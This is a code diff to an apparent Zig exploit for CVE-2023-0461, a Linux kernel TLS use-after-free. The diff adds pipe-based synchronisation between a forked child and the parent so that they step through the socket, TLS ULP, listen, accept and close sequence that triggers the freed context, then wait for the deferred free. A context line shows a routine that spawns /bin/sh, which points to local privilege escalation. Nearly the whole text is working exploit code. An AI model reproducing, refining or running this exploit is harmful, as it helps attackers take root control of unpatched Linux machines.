@@ -103,6 +103,35 @@ fn setTLSOpt(sk: os.socket_t, dir: Direction) !void {
     try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(dir), mem.asBytes(&crypto));
 }
 
+const SyncPipe = struct {
+    const Self = @This();
+
+    pipe: [2]os.fd_t,
+
+    pub fn init() !Self {
+        return .{
+            .pipe = try os.pipe(),
+        };
+    }
+
+    pub fn deinit(self: Self) void {
+        os.close(self.pipe[0]);
+        os.close(self.pipe[1]);
+    }
+
+    pub fn wait(self: Self, on: u8) !void {
+        var buf = [_]u8{0x00};
+        _ = try os.read(self.pipe[0], &buf);
+
+        if (buf[0] != on)
+            return error.desync;
+    }
+
+    pub fn cont(self: Self, on: u8) !void {
+        _ = try os.write(self.pipe[1], &.{on});
+    }
+};
+
 fn sh() !void {
     const allc = std.heap.page_allocator;
     var child = std.process.Child.init(&[_][]const u8{"/bin/sh"}, allc);
@@ -118,6 +147,8 @@ fn cve_2023_0461() !void {
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
 
+    const sync = try SyncPipe.init();
+    defer sync.deinit();
     const child_pid = try os.fork();
 
     if (child_pid == 0) {
@@ -128,6 +159,7 @@ fn cve_2023_0461() !void {
 
             try os.bind(server_sk, server_addr_p, addr_sz);
             try os.listen(server_sk, 1);
+            try sync.cont(0);
 
             const client_sk = try os.accept(server_sk, null, null, 0);
             os.closeSocket(client_sk);
@@ -136,14 +168,9 @@ fn cve_2023_0461() !void {
         log.info("child: connect for second connection", .{});
         const client_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
         defer os.closeSocket(client_sk);
+        try sync.wait(1);
         try retry_connect(client_sk, target_addr_p, addr_sz);
-
-        const client_sk2 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
-        defer os.closeSocket(client_sk2);
-        try retry_connect(client_sk2, target_addr_p, addr_sz);
-
-        var buf: [192]u8 = undefined;
-        _ = try os.read(client_sk2, &buf);
+        try sync.wait(2);
 
         return;
     }
@@ -154,6 +181,7 @@ fn cve_2023_0461() !void {
     const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
     defer os.closeSocket(target_sk);
 
+    try sync.wait(0);
     try retry_connect(target_sk, server_addr_p, addr_sz);
     try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");
 
@@ -163,10 +191,15 @@ fn cve_2023_0461() !void {
     log.info("parent: listen for second connection", .{});
 
     try os.listen(target_sk, 1);
+    try sync.cont(1);
 
     const client_sk = try os.accept(target_sk, null, null, 0);
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
+    try sync.cont(2);
+
+    log.info("parent: wait for deferred free", .{});
+    os.nanosleep(5, 5000000);
 
     log.info("Goodbye!", .{});
 }
